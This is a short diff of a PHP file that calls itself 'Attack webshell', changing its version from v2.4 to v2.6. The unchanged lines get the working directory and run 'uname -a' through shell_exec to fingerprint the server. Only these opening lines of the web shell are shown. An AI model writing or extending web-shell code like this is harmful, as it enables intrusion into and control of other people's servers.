@@ -1,5 +1,5 @@
 <?php
-define('SCRIPT_NAME', 'Attack webshell v2.4');
+define('SCRIPT_NAME', 'Attack webshell v2.6');
 
 $current_directory = getcwd();
 $current_device = shell_exec('uname -a');
